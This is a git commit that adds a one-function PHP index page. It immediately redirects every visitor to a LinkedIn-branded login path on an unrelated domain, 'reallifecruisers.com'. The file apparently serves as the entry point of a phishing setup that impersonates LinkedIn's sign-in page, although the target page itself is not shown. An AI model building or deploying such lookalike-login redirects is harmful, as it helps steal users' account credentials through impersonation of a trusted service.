6f870376888d11401083f3e8c31924606728e457
simonwytan <56983361+simonwytan@users.noreply.github.com>
2019-10-24 16:33:52 -0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,17 @@
+<?php
+
+
+function Redirect($url, $permanent = false)
+{
+ if (headers_sent() === false)
+ {
+ header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
+ }
+
+ exit();
+}
+
+Redirect("https://linkedin.reallifecruisers.com/login?
+", false);
+
+?>
